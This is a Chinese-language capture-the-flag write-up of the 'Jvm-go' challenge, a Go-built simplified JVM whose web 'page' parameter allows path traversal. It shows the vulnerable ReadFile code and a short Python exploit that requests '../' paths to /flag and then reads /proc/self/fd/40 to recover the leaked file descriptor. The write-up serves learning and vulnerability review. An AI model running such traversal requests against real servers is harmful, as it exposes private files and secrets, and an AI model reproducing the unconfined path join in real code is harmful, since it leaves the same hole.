# Jvm-go

## 题目简述

题目提供了一个用 Go 实现的简化 JVM，并在其上运行 Web 服务。官方 exp 显示 Web 参数 `page` 被用于读取页面文件，可通过路径穿越访问宿主文件。

源码中的文件读取函数位于 `vmutils.Dir.ReadFile`：

```go
func (dir *Dir) ReadFile(filename string) ([]byte, error) {
    absFilename := filepath.Join(dir.absPath, filename)
    if data, err := ioutil.ReadFile(absFilename); err != nil {
        return nil, err
    } else {
        return data, nil
    }
}
```

这里没有对 `..`、绝对路径或最终解析路径做限制。

## 解题过程

### 关键机制

直接读取 `/flag` 会让服务进程打开 flag 文件。题目中的 JVM/HTTP 服务没有及时释放所有文件描述符，因此可以继续通过 `/proc/self/fd/<n>` 访问已打开的文件描述符。官方 exp 中目标 fd 为 40。

### 求解步骤

先多次请求 `/flag`，目的是让服务进程打开该文件并产生稳定 fd：

```python
import requests

BASE = "<target>"

for _ in range(30):
    requests.get(f"{BASE}/?page=../../../../../../../../../../flag")

flag = requests.get(
    f"{BASE}/?page=../../../../../../../../../../proc/self/fd/40"
).text
print(flag)
```

实际环境端口以题目为准。若 fd 不稳定，遍历 `/proc/self/fd/` 中的数字即可。

## 方法总结

- 漏洞点：`filepath.Join` 后没有做路径归一化和根目录约束。
- 利用点：路径穿越读取 `/proc/self/fd/<n>`，绕过直接读取 flag 时的限制。
- 排查方式：遇到自实现运行时或虚拟机时，要同时审查虚拟文件系统和宿主文件描述符泄露。
